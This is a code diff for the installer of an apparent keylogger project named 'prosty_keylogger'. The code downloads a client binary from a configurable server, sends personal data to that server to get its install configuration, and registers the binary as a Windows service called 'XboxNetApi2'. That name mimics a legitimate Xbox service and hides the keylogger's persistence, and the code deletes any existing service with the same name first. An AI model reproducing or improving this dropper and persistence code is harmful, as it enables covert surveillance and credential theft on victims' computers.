@@ -4,10 +4,13 @@ use std::fs;
 use std::path::{Path, PathBuf};
 use reqwest::Url;
 use std::env;
+use clap::Parser;
+use iced::advanced::layout::atomic;
 use log::error;
-use prosty_keylogger::common::{InstallConfiguration, PersonalData, TaskConfiguration};
+use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData, TaskConfiguration};
+use crate::options::Options;
 
-async fn download_client(url: Url) -> Result<Vec<u8>, anyhow::Error>{
+async fn download_client(url: &Url) -> Result<Vec<u8>, anyhow::Error>{
     let web_client = reqwest::Client::new();
     let b= web_client.get(url.join("/client")?).send()
         .await?
@@ -17,7 +20,7 @@ async fn download_client(url: Url) -> Result<Vec<u8>, anyhow::Error>{
 
 }
 
-fn download_and_save_client(url: Url, dir: &Path, filename: &Path) -> Result<(), anyhow::Error>{
+fn download_and_save_client(url: &Url, dir: &Path, filename: &Path) -> Result<(), anyhow::Error>{
     let rt = tokio::runtime::Runtime::new()?;
     let content = rt.block_on(async {
         let c = download_client(url).await?;
@@ -31,22 +34,46 @@ fn download_and_save_client(url: Url, dir: &Path, filename: &Path) -> Result<(),
     Ok(())
 }
 
-fn install_client(install_configuration: &InstallConfiguration) -> Result<(), anyhow::Error>{
-    let home_drive = env::var("HOMEDRIVE")?;
-    let home_dir = env::var("HOMEPATH")?;
-    println!("{}", home_dir);
-    let dir = PathBuf::from_iter([&home_drive, &home_dir, "Documents/system/ptdd_x6"]);
+
+fn register_service(file_path: &Path) -> Result<(), anyhow::Error>{
+
+    let f = file_path.as_os_str().to_str().unwrap();
+    println!("{f}");
+    let r_output = std::process::Command::new("cmd")
+        .args(["/C", "sc.exe", "delete", "XboxNetApi2"])
+        .output()?;
+    println!("{:?}", r_output);
+    let output = std::process::Command::new("cmd")
+        .args(["/C", "sc.exe", "create","XboxNetApi2", &format!("binPath=\"{f}\"")])
+        .output()?;
+
+    println!("{:?}", output);
+    Ok(())
+}
+fn install_client(url: &Url, install_configuration: &InstallConfiguration) -> Result<(), anyhow::Error>{
+
+    let dir = PathFragment::join_slice(&install_configuration.installation_base_path)?;
+
+    let filename= &install_configuration.installation_file_name;
+    let file_path = dir.join(&install_configuration.installation_file_name);
+    //let home_drive = env::var("HOMEDRIVE")?;
+    //let home_dir = env::var("HOMEPATH")?;
+    //let dir = PathBuf::from_iter([&home_drive, &home_dir, "Documents/system/ptdd_x6"]);
     //let dir = PathFragment::join_slice(&task_configuration.installation_path)?;
 
-    println!("{:?}", dir);
-    let path = PathBuf::from("dl");
-    download_and_save_client(Url::parse("http://localhost:8080")?, &dir, &path).unwrap();
+    println!("{:?}, {:?}, {:?}", &dir, &filename, &file_path);
+    //let path = PathBuf::from(install_configuration.);
+    download_and_save_client(url, &dir, filename)?;
+    register_service(&file_path)?;
+
+
+
     Ok(())
 }
 
-async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<InstallConfiguration, anyhow::Error>{
+async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<InstallConfiguration, anyhow::Error>{
     let s = match personal_data{
-        None => reqwest::get(url).await?.text().await?,
+        None => reqwest::get(url.to_owned()).await?.text().await?,
         Some(data) => {
             let client = reqwest::Client::new();
             let json = serde_json::to_string(&data)?;
@@ -58,21 +85,22 @@ async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<In
 }
 fn main()-> Result<(), anyhow::Error> {
     let rt = tokio::runtime::Runtime::new()?;
+    let args = Options::parse();
     let personal_data = PersonalData{
         name: None,
         last_name: None,
         gender: None,
     };
-
+    let  url = Url::parse(&args.server_address)?;
     let config = rt.block_on(async{
         //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
-        let config = get_config(Url::parse("http://127.0.0.1:8080")?, Some(&personal_data)).await?;
+        let config = get_config(&url, Some(&personal_data)).await?;
         return Ok::<InstallConfiguration, anyhow::Error>(config);
 
     })?;
 
 
-    install_client(&config)?;
+    install_client(&url, &config)?;
     Ok(())
 
 }
